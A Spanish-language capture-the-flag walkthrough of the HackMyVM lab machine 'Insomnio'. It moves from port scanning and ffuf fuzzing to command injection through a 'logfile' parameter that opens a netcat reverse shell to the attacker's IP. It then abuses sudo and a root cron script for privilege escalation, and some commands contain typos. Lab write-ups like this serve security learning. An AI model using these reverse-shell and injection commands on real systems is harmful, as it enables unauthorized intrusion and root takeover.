## MAQUINA INSOMNIO

![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20230311.png).

Realizamos un escaneo de red con netdiscover para ver las maquinas conectas a mi red.

```bash
netdiscover -i eth0 -r 192.158.0.162
```
![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20205346.png)

Seguido de eso cuando ya tenemos la ip victima hacemos un ping ella, en este caso la ip victima es: 192.168.0.146

Hacemos un escaneo de puertos con nmap usando el siguiente comando:

```bash
nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 192.168.0.146

nmap -sV -sC 192.168.0.146
```

![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20205600.png)

Como resultado nmap mostro que solo hay un puerto abierto: puerto 8080

Utilizamos whatweb para ver que mas información sobre la pagina.

![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20205821.png).

Entramos a sitio web colocando la ip en el navegador.

![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20210028.png)

Aca una vez ingresando un nombre cualquiera podemos ingresar cualquiera palabra y esta no nos devolvera ninguna respuesta.

![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20210118.png)

Buscamos directorios ocultos con FFUF usando el siguiente comando:

```bash
ffuf -c -w "wordlists" -e .html,.php,.txt -u http://192.168.0.146 -fs 2899

chat.txt
administration.php
process.php

"-fs 2899`: Filtra las respuestas para mostrar solo aquellas que tienen un tamaño de contenido de 2899 bytes."
```
![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20212848.png)

fuff encontro 3 resultados vamos a ver su contenido:

>chat.txt

Muestra lo que enviamos al chat.

![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20212713.png)

>administration.php

Aca hay algo interesante ya que podría estar esperando algo después del símbolo de dos puntos "view:". Vamos a terminar de completar la url en php ya que nos falta el parametros que no tenemos!.

![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20210356.png)

```bash
Importante por si no saben:
Esquema: http
Host: ip
Puerto: 8080
Ruta: administration.php
Parametros (?xxx=xxx): en este caso no tenemos ! 

En PHP, una URL se forma mediante la combinación de varios componentes, que incluyen el esquema, el host, el puerto, la ruta, los parámetros de consulta y los fragmentos. Aquí te presento una descripción general de cada componente:

1. **Esquema (Scheme)**: Especifica el protocolo utilizado para acceder al recurso. Por ejemplo, "http" o "https".
    
2. **Host**: Es el nombre de dominio o la dirección IP del servidor al que se está accediendo.
    
3. **Puerto**: Opcionalmente, puede especificar el puerto del servidor al que se está accediendo. Por defecto, los navegadores web utilizan el puerto 80 para HTTP y el puerto 443 para HTTPS si no se especifica ningún puerto.
    
4. **Ruta (Path)**: Especifica la ubicación del recurso en el servidor. Por ejemplo, "/ruta/a/mi/recurso".
    
5. **Parámetros de Consulta (Query Parameters)**: Opcionalmente, puedes incluir parámetros de consulta para enviar datos adicionales al servidor. Estos parámetros están separados de la URL base por un signo de interrogación (`?`) y se separan entre sí por el símbolo ampersand (`&`). Por ejemplo, "?param1=valor1&param2=valor2".
    
6. **Fragmento (Fragment)**: Opcionalmente, puedes incluir un fragmento que especifica una ubicación específica dentro del recurso al que se está accediendo. El fragmento se identifica mediante el símbolo de almohadilla (`#`) seguido del identificador del fragmento.
    

Un ejemplo de URL en PHP sería:

==`$url = "https://www.ejemplo.com:8080/ruta/a/mi/recurso?param1=valor1&param2=valor2#fragmento";`==

Aquí, "https" es el esquema, "[www.ejemplo.com](http://www.ejemplo.com/)" es el host, "8080" es el puerto, "/ruta/a/mi/recurso" es la ruta, "param1=valor1&param2=valor2" son los parámetros de consulta y "fragmento" es el fragmento.

```
En este caso utilizamos ffuf para encontrar algun parametro php en la url.

```bash
ffuf -c -w /wordlists/ -u http:ip/admnistration.php?FUZZ=hola -fs 65
```
![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20221049.png)

Genial! Obtuvimos como resultado un parametro llamado logfile, asi que suplantamos el "?FUZZ" de la url con el "?logfile", y nos devuelve el parametro "hola" en la web.

![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20221216.png)

Ahora podemos enviarnos una revershell a nuestra maquina atacante.

Para ello utilizamos el siguiente comando

```bash
maquina atacante:
1ero.: nc -nlvp 1234

maquina victima (en url)
2do.: nc -e /bin/bash 192.168.0.162 1234
```
![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20222710.png)

# Atencion: Atento el ";" si no se coloca no se enviar la revershell. $url = "http://example.com/page.php?id=1;"; // Nota el punto y coma al final.

![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20222734.png)

Listo tenemos conexion y somos usuario www-data, vamos escalar privilegios.

En el directorio home tenemos el usuario 'JULIA'
Vemos si tenemos permiso sudo, y encontramos que hay un script.sh ejecuntando en la ruta /var/www/html que no requiere contraseña.

![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20223929.png)

Hacemos lo  siguiente:

```bash
echo '/bin/bas' >> start.sh

"Este comando imprime el texto '/bin/bash' en la salida estándar (normalmente la pantalla)."

"`Entonces, en resumen, el comando echo '/bin/bash' >> start.sh añade la línea '/bin/bash' al final del archivo start.sh. Esto es comúnmente utilizado en scripts de shell para añadir comandos, rutas o cualquier otra información que necesiten ser escritos en un archivo para ser utilizados posteriormente. En este caso particular, se está agregando la ruta al intérprete de comandos Bash al archivo start.sh.`"
```

Con esto cambiamso el usuario de www-data a julia

![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20224631.png)

![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20224705.png)

Leemos lo archivos crontab y parecer que ejecuta como root un script.sh en la ruta /var/cron.

```bash
cat /etc/crontab
```
![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20225301.png)

Vamos a enviarnos el una revershell hacia nuestra maquina para obtener el usuario root, asi que realizamos los siguiente:

```bash
`echo 'echo 'nc -e /bin/bash ip puerto' >> /var/cron/check.sh'`
```
![imagen](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-29%20230120.png)

Y listo somos usuario root










